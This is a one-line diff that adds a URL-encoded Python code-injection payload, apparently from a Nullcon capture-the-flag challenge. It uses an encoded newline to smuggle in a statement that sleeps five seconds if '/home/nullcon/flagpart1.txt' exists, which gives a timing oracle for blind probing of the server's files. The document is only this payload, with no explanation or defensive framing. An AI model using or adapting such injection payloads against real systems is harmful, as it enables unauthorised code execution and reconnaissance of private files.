@@ -1,0 +1,1 @@
+import os.path%0A__import__('time').sleep(5 if os.path.isfile('/home/nullcon/flagpart1.txt') else 0)
